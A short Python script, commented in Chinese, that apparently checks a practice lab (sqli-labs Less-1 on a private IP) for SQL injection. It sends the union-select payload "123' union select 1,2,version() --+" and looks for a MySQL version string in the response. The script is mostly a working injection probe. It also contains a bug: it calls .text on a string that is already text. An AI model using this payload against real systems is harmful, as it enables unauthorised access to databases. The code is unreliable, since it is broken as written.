# coding:utf-8


# 导入 requests 库
import requests

# 手动设置漏洞链接
url = "http://192.168.114.129:83/Less-1/?id=1"

headers = {'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"}
payload = "123' union select 1,2,version() --+"
res = requests.get(url + payload,  headers=headers, timeout = 5).text

if "Your Password:5.7.26" in res.text:
    print('[+]Vulnerable to SQL injection: ' + url)
else:
    print('[-] Not Vulnerable: ' + url)